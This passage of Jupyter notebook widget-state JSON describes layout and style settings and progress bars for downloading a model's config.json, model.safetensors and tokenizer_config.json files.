          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ddcb5d8a46c84f6e97e05ee0062e9353": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "cc71dceaa56742cbb65ada68a595867b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "34a212d871ff45d4b0cc7c2de93e2a1a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7f611ba3c398460aa675f3977e09531b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "4b923a9f47cb4cd6863404bb7fd1fa91": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f8ae5d0862234062a1d7ec502708a28c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "c987140944c04cc29eb6f3793eec46db": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_2d08627dfca1496492395ac4d7546e16",
              "IPY_MODEL_9e9e1052feb1438d8356083f19c424b5",
              "IPY_MODEL_c39af7abf1c949379949214a72214bbf"
            ],
            "layout": "IPY_MODEL_3007c50c53804e47bcd5c52c6528e8b2"
          }
        },
        "2d08627dfca1496492395ac4d7546e16": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_6fb0edc8819344cfa40163b6bbcaa94d",
            "placeholder": "​",
            "style": "IPY_MODEL_60bf6901ace14047b3b19d7882952598",
            "value": "config.json: 100%"
          }
        },
        "9e9e1052feb1438d8356083f19c424b5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f6ff06adaeda4db29df569e1176298bf",
            "max": 612,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_3beb54e80653477ebdc0b6641ad28c34",
            "value": 612
          }
        },
        "c39af7abf1c949379949214a72214bbf": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_98d181213cb24e9aa676f8197d4b41e0",
            "placeholder": "​",
            "style": "IPY_MODEL_312a1c95f0af41b2896f6c7a5c495781",
            "value": " 612/612 [00:00&lt;00:00, 27.3kB/s]"
          }
        },
        "3007c50c53804e47bcd5c52c6528e8b2": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6fb0edc8819344cfa40163b6bbcaa94d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "60bf6901ace14047b3b19d7882952598": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "f6ff06adaeda4db29df569e1176298bf": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3beb54e80653477ebdc0b6641ad28c34": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "98d181213cb24e9aa676f8197d4b41e0": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "312a1c95f0af41b2896f6c7a5c495781": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "b01b67e4cc634f2d9d642143081bb5d7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_db87f279a25e4cb3b6983fa0bd227fb2",
              "IPY_MODEL_51e44ca58b0348b4899d9a515356d9ca",
              "IPY_MODEL_1c38d90f73b34f5593bfa77f0e036852"
            ],
            "layout": "IPY_MODEL_c121423f635f4404a1ef6f2a265e7b24"
          }
        },
        "db87f279a25e4cb3b6983fa0bd227fb2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_0069c03ea934489c8d591d62c7ff982f",
            "placeholder": "​",
            "style": "IPY_MODEL_2a0c1a75af5e4747bf92fc9f76d5dd1c",
            "value": "model.safetensors: 100%"
          }
        },
        "51e44ca58b0348b4899d9a515356d9ca": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9a56ac4e8dc5434eb284de323f6ef757",
            "max": 90868376,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_6d07a832b3cb42d4a85c9908fdcbec02",
            "value": 90868376
          }
        },
        "1c38d90f73b34f5593bfa77f0e036852": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e2ff16fe72b64dc99ad5a50bf535fb60",
            "placeholder": "​",
            "style": "IPY_MODEL_975b633326c840a7b854a36cd8d8df2e",
            "value": " 90.9M/90.9M [00:00&lt;00:00, 124MB/s]"
          }
        },
        "c121423f635f4404a1ef6f2a265e7b24": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0069c03ea934489c8d591d62c7ff982f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2a0c1a75af5e4747bf92fc9f76d5dd1c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9a56ac4e8dc5434eb284de323f6ef757": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6d07a832b3cb42d4a85c9908fdcbec02": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "e2ff16fe72b64dc99ad5a50bf535fb60": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "975b633326c840a7b854a36cd8d8df2e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "56ee0eebda044ee28442c07e91bd558a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_e767817682554ab9966fa543413a0a50",
              "IPY_MODEL_7994f80079bd4b5782ce92126516410d",
              "IPY_MODEL_c1757213e17846118a7111b048142b1e"
            ],
            "layout": "IPY_MODEL_aaa41dd11525497583f5277ed1ca4f83"
          }
        },
        "e767817682554ab9966fa543413a0a50": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_b0c93a19614149df8113fcd4b3a90adc",
            "placeholder": "​",
            "style": "IPY_MODEL_a90e98337d244ea5b97fc476b77d3591",
            "value": "tokenizer_config.json: 100%"
          }
        },
        "7994f80079bd4b5782ce92126516410d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9923d3bbfca64a76a571f9f62e2d2345",
            "max": 350,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_af09ce709c5c47f6a15cd53eeb6a7de9",
            "value": 350
          }
        },
        "c1757213e17846118a7111b048142b1e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_15db90b204814950994485569fbdf203",
            "placeholder": "​",
            "style": "IPY_MODEL_6cd408dd55c2436e9612f7009831c1a7",
            "value": " 350/350 [00:00&lt;00:00, 16.0kB/s]"
          }
        },
        "aaa41dd11525497583f5277ed1ca4f83": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b0c93a19614149df8113fcd4b3a90adc": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a90e98337d244ea5b97fc476b77d3591": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9923d3bbfca64a76a571f9f62e2d2345": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
